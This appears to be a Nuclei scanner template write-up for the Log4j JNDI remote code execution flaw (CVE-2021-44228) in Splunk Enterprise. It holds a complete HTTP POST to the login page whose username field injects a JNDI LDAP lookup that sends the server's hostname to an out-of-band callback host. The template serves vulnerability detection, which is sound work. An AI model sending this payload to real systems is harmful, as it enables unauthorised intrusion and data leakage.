# Nuclei Template: Splunk Enterprise - Remote Code Execution (Apache Log4j)
**Template ID:** splunk-enterprise-log4j-rce
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`splunk-enterprise-log4j-rce.yaml`)

## Vulnerability Information & PoC

## Description
Splunk Enterprise is susceptible to Log4j JNDI remote code execution. Splunk Enterprise enables you to search, analyze and visualize your data to quickly act on insights from across your technology landscape.

## Steps to reproduce / Exploit Payload
```http
POST /en-US/account/login HTTP/1.1
Host: {{Hostname}}
Accept: text/javascript, text/html, application/xml, text/xml, /
X-Requested-With: XMLHttpRequest
Origin: {{RootURL}}
Referer: {{RootURL}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

cval={{unix_time()}}&username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&password={{str}}&return_to=%2Fen-US%2F
```

## References
- https://www.splunk.com/en_us/blog/bulletins/splunk-security-advisory-for-apache-log4j-cve-2021-44228.html
